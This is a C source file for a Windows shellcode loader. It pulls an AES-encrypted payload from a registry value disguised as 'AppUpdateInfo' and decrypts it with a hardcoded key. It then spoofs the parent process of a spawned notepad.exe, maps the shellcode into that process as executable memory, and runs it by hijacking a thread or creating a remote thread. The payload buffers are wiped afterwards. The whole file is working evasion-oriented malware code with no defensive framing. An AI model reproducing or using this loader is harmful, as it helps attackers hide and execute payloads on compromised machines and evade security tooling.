#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>
#include <TlHelp32.h>

#include "ntdll.h"

#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "ntdll")
#pragma comment (lib, "OneCore.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#define REGISTRY "Control Panel"
#define REGISTERING "AppUpdateInfo"
#define HIJACK

#define good(msg, ...)  printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...)  printf("[i] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...)  printf("[-] " msg "\n", ##__VA_ARGS__)
#define errormsg(msg, ...) printf("		" msg "\n", ##__VA_ARGS__)

typedef struct _AES {
	PBYTE pPlainText;
	DWORD dwPlainSize;

	PBYTE pCipherText;
	DWORD dwCipherSize;

	PBYTE pKey;
	PBYTE pIv;
}AES, * PAES;

unsigned char pIv[] = {
		0xF0, 0x99, 0xA7, 0x11, 0x06, 0xBE, 0x3D, 0x7C, 0x7E, 0x6C, 0x33, 0xDC, 0xD6, 0x37, 0x99, 0x92 };

unsigned char pKey[] = {
		0xF0, 0x99, 0xA7, 0x11, 0x06, 0xBE, 0x3D, 0x7C, 0x7E, 0x6C, 0x33, 0xDC, 0xD6, 0x37, 0x99, 0x92,
		0x41, 0x96, 0xDE, 0xDC, 0x4C, 0xF1, 0x97, 0x94, 0xC1, 0xFB, 0x7C, 0x1B, 0xCB, 0x42, 0xB3, 0x90 };

BOOL AesDecryption(PAES pAes) {

	BOOL                  STATE = TRUE;
	NTSTATUS              status = NULL;

	BCRYPT_ALG_HANDLE     hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE     hKeyHandle = NULL;

	ULONG                 cbResult = NULL;
	DWORD                 dwBlockSize = NULL;

	DWORD                 dwKeyObject = NULL;
	PBYTE                 pKeyObject = NULL;

	PBYTE                 pPlainText = NULL;
	DWORD                 dwPlainText = NULL;

	if ((status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0)) != STATUS_SUCCESS) {
		error("DECRYPTION BCryptOpenAlgorithmProvider failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	if ((status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&dwKeyObject, sizeof(DWORD), &cbResult, 0)) != STATUS_SUCCESS) {
		error("DECRYPTION first BCryptGetProperty failed");
		printf("	\\__\n");
		errormsg("0x%d\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	if ((status = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0)) != STATUS_SUCCESS) {
		error("DECRYPTION second BCryptGetProperty failed");
		printf("	\\__\n");
		errormsg("0x%d\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	if (dwBlockSize != 16) {
		error("DECRYPTION Block size of InstallAesDecrypt not right");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	pKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwKeyObject);
	if (pKeyObject == NULL) {
		error("DECRYPTION key object not populated in InstallAesDecrypt");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	if ((status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != STATUS_SUCCESS) {
		error("DECYRPTION BCryptSetProperty failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	if ((status = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pKeyObject, dwKeyObject, (PBYTE)pAes->pKey, 32, 0)) != STATUS_SUCCESS) {
		error("DECRYPTION BCryptGenerateSymmetricKey failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	if ((status = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, 16, NULL, 0, &dwPlainText, BCRYPT_BLOCK_PADDING)) != STATUS_SUCCESS) {
		error("DECRYPTION first BCryptDecrypt failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	pPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwPlainText);
	if (pPlainText == NULL) {
		error("DECRYPTION pbPlainText is null in InstallAesDecryption");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	if ((status = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, 16, pPlainText, dwPlainText, &cbResult, BCRYPT_BLOCK_PADDING)) != STATUS_SUCCESS) {
		error("DECRYPTION second BCryptDecrypt failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}


_CLEANUP:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pKeyObject) {
		HeapFree(GetProcessHeap(), 0, pKeyObject);
	}
	if (pPlainText != NULL && STATE) {
		pAes->pPlainText = pPlainText;
		pAes->dwPlainSize = dwPlainText;
	}

	return STATE;
}

BOOL Decryption(PVOID pCipherTextData, DWORD sCipherTextSize, PBYTE pKey, PBYTE pIv, PVOID* pPlainTextData, DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL) {
		printf("Improper data being passed to Decryption function\n");
		return FALSE;

	}

	AES Aes = { 0 };
	Aes.pKey = pKey;
	Aes.pIv = pIv;
	Aes.pCipherText = (PBYTE)pCipherTextData;
	Aes.dwCipherSize = sCipherTextSize;

	if (!AesDecryption(&Aes)) {
		return FALSE;
	}

	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}

BOOL ReadFromRegistry(PVOID* pEncryptedPayload, DWORD* sEncryptedPayloadSize) {

	BOOL STATE = TRUE;
	NTSTATUS status = NULL;
	LPVOID pBytes = NULL;
	DWORD dwBytesRead = NULL;

	if ((status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGISTERING, RRF_RT_ANY, NULL, NULL, &dwBytesRead)) != ERROR_SUCCESS) {
		error("First RegGetValueA failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);

	if ((status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGISTERING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead)) != ERROR_SUCCESS) {
		error("Second RegGetValueA failed");
		printf("	\\__\n");
		errormsg("0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}


_CLEANUP:

	if (!STATE) {
		return STATE;
	}

	*pEncryptedPayload = pBytes;
	*sEncryptedPayloadSize = dwBytesRead;

	if (pBytes) {
		memset(&pBytes, '\0', sizeof(pBytes));
	}

	return STATE;
}

BOOL RemoteMapInjection(HANDLE hProcess, PBYTE shellcode, SIZE_T sPayloadSize, PVOID* ppShellCodeAddress) {

	BOOL STATE = TRUE;
	HANDLE hFile = NULL;
	PVOID pMapLocalAddress = NULL;
	PVOID pMapRemoteAddress = NULL;

	if (hProcess == NULL || shellcode == NULL || sPayloadSize == NULL) {
		error("Invalid parameters passed to RemoteMapInjection");
		STATE = FALSE; goto _CLEANUP;
	}

	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);

	if (hFile == NULL) {
		error("CreateFileMapping failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);

	if (pMapLocalAddress == NULL) {
		error("first pMapLocalAddress failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	memcpy(pMapLocalAddress, shellcode, sPayloadSize);

	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);

	if (pMapRemoteAddress == NULL) {
		error("second pMapRemoteAddress failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

_CLEANUP:
	if (hFile) {
		NtClose(hFile);
	}
	*ppShellCodeAddress = pMapRemoteAddress;

	return STATE;
}

BOOL PPIDSpoofing(HANDLE hParentProcess, DWORD* dwThreadId, DWORD* dwProcessId, HANDLE* hThread, HANDLE* hProcess) {

	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	BOOL STATE = TRUE;

	SIZE_T sThreadAttributeList = NULL;
	STARTUPINFOEXA SiEx = { 0 };

	PPROC_THREAD_ATTRIBUTE_LIST pThreadAttributeList = NULL;
	PROCESS_INFORMATION PI = { 0 };



	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&PI, sizeof(PROCESS_INFORMATION));

	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttributeList);


	pThreadAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttributeList);

	if (!pThreadAttributeList) {
		error("Failed to allocate pThreadAttributeList");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	if (!InitializeProcThreadAttributeList(pThreadAttributeList, 1, NULL, &sThreadAttributeList)) {
		error("Second intializeProcThreadAttributeList failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}


	if (!UpdateProcThreadAttribute(pThreadAttributeList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		error("UpdateProcThreadAttribute failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}
	
	SiEx.lpAttributeList = pThreadAttributeList;

	if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SiEx.StartupInfo, &PI)) {
		error("CreateProcessW failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	*dwThreadId = PI.dwThreadId;
	*dwProcessId = PI.dwProcessId;
	*hThread = PI.hThread;
	*hProcess = PI.hProcess;


_CLEANUP:

	if (pThreadAttributeList != NULL) {
		DeleteProcThreadAttributeList(pThreadAttributeList);
	}
	NtClose(hParentProcess);

	if (hProcess != NULL && hThread != NULL && dwProcessId != NULL && dwThreadId != NULL) {
		STATE = TRUE;
	}
	return STATE;
}

BOOL HijackThread(HANDLE hThread, PVOID pAddress) {

	BOOL STATE = TRUE;
	NTSTATUS status = NULL;

	ULONG uPreviousSuspension = NULL;
	CONTEXT ThreadCTX = { 0 };

	ThreadCTX.ContextFlags = CONTEXT_ALL;

	NtSuspendThread(hThread, &uPreviousSuspension);

	if (!GetThreadContext(hThread, &ThreadCTX)) {
		error("GetThreadContext failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	ThreadCTX.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCTX)) {
		error("SetThreadContext failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	NtResumeThread(hThread, &uPreviousSuspension);


_CLEANUP:
	return STATE;
}

BOOL GetRemoteThreadhandle(DWORD dwProcessId, DWORD* dwThreadId, HANDLE* hThread) {

	HANDLE         hSnapShot = NULL;
	THREADENTRY32  Thr = { 0 };
	Thr.dwSize = sizeof(THREADENTRY32);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		error("CreateToolhelp32Snapshot Failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Thread32First(hSnapShot, &Thr)) {
		error("Thread32First Failed");
		printf("	\\__\n");
		errormsg("0x%d\n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwThreadId) {

			*dwThreadId = Thr.th32ThreadID;
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				error("OpenThread Failed");
				printf("	\\__\n");
				errormsg("0x%d\n", GetLastError());

			break;
		}
	} while (Thread32Next(hSnapShot, &Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}


int main(int argc, char* argv[]) {

	BOOL STATE = TRUE;
	NTSTATUS status = NULL;

	HANDLE hProcess = NULL;
	HANDLE hParentProcess = NULL;
	HANDLE hThread = NULL;
	LPVOID rBuffer = NULL;

	PVOID shellcode = NULL;
	SIZE_T sShellCodeSize = NULL;

	PVOID pEncryptedPaylod = NULL;
	DWORD sEncryptedPayloadSize = NULL;

	PVOID ppPayloadAddress = NULL;

	DWORD dwProcessId = NULL;
	DWORD dwThreadId = NULL;

	CLIENT_ID CI = { 0 };
	OBJECT_ATTRIBUTES OA = { 0 };
	PROCESS_INFORMATION PI = { 0 };

	OA.Length = sizeof(OBJECT_ATTRIBUTES);
	OA.Attributes = 0x00000040L;


	if (argc < 2) {
		error("Too few arguments in terminal");
		info("USAGE: %d <PID>", argv[0]);
		STATE = FALSE; goto _CLEANUP;
	}
	
	CI.UniqueProcess = atoi(argv[1]);

	if ((status = NtOpenProcess(&hParentProcess, PROCESS_ALL_ACCESS, &OA, &CI)) != STATUS_SUCCESS) {
		error("NtOpenProcess failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	good("Successfully opened handle to the parent process");
	printf("-------------\n");
	info("Parent Process: 0x%p\n", hParentProcess);

	if (!PPIDSpoofing(hParentProcess, &dwThreadId, &dwProcessId, &hThread, &hProcess)) {
		error("PPID Spoofing failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	good("Successfully spoofed the PPID of our process");
	printf("-------------\n");
	info("PID of our new process: %d", dwProcessId);
	info("PPID: %s\n", argv[1]);
	info("Handle of our new process: 0x%p", hProcess);
	info("Handle of our new thread: 0x%p\n", hThread);

	if (!GetRemoteThreadhandle(dwProcessId, &dwThreadId, &hThread)) {
		error("GetRemoteThreadHandle failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	if (!ReadFromRegistry(&pEncryptedPaylod, &sEncryptedPayloadSize)) {
		error("ReadFromRegistry Failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	good("Successfully read our encrypted payload from the the Windows Registry: Computer\\HKEY_CURRENT_USER\\%s\\%s", REGISTRY, REGISTERING);
	printf("-------------\n");
	info("Encrypted payload size: %zu-bytes\n", sEncryptedPayloadSize);


	if (!Decryption(pEncryptedPaylod, sEncryptedPayloadSize, pKey, pIv, &shellcode, (DWORD*)&sShellCodeSize)) {
		error("Decryption failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	good("Successfully decrypted our payload");
	printf("-------------\n");
	info("Decrypted payload size: %zu-bytes\n", sShellCodeSize);


	memset(pEncryptedPaylod, '\0', sEncryptedPayloadSize);
	info("Overwrote encrypted payload with NULL-bytes\n");


	if (!RemoteMapInjection(hProcess, (PBYTE)shellcode, sShellCodeSize, &ppPayloadAddress)) {
		error("RemoteMapInjection failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}

	good("Successfully injected payload into the remote process");
	printf("-------------\n");
	info("Payload address in remote process: 0x%lx\n", ppPayloadAddress);

	memset(shellcode, '\0', sShellCodeSize);
	info("Overwrote decrypted payload with NULL-bytes\n");

#ifdef HIJACK

	if (!HijackThread(hThread, ppPayloadAddress)) {
		error("HijackThread failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%d\n", GetLastError());
		STATE = FALSE; goto _CLEANUP;
	}
	good("Successfully hijacked thread\n");


#endif HIJACK

#ifdef CREATE
	if ((status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, ppPayloadAddress, NULL, FALSE, 0, 0, 0, NULL)) != STATUS_SUCCESS) {
		error("NtCreateThreadEx failed");
		printf("	\\__\n");
		errormsg("ERROR: 0x%0.8x\n", status);
		STATE = FALSE; goto _CLEANUP;
	}

	good("NtCreatThreadEx Success\n");

#endif CREATE

	info("Cleaning up");

_CLEANUP:

	if (hProcess) {
		NtClose(hProcess);
	}
	if (hThread) {
		NtClose(hThread);
	}
	if (pEncryptedPaylod != NULL) {
		memset(pEncryptedPaylod, '\0', sEncryptedPayloadSize);
	}
	if (shellcode != NULL) {
		memset(shellcode, '\0', sShellCodeSize);
	}
	if (!STATE) {
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}